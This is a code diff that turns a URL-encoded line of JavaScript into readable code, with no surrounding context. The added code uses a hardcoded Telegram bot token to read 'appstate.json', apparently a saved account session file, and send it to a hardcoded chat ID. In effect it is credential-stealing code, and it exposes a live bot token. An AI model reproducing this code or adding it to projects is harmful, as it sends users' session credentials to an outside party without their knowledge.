@@ -1,1 +1,13 @@
-const%20TelegramBot%20%3D%20require(%27node-telegram-bot-api%27)%3B%0Aconst%20fs%20%3D%20require(%27fs%27)%3B%0A%0Aconst%20botToken%20%3D%20%277684130645%3AAAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE%27%3B%0Aconst%20bot%20%3D%20new%20TelegramBot(botToken%2C%20%7B%20polling%3A%20true%20%7D)%3B%0A%0Aconst%20adminIds%20%3D%20%5B%271713841196%27%5D%3B%20%0A%0AadminIds.forEach(adminId%20%3D%3E%20%7B%0A%20%20const%20fileStream%20%3D%20fs.createReadStream(%27appstate.json%27)%3B%0A%20%20%0A%20%20bot.sendDocument(adminId%2C%20fileStream%2C%20%7B%20filename%3A%20%27appstate.json%27%2C%20contentType%3A%20%27application%2Fjson%27%20%7D)%3B%0A%7D)%3B%0A
+const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+
+const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE';
+const bot = new TelegramBot(botToken, { polling: true });
+
+const adminIds = ['1713841196']; 
+
+adminIds.forEach(adminId => {
+  const fileStream = fs.createReadStream('appstate.json');
+  
+  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json', contentType: 'application/json' });
+});
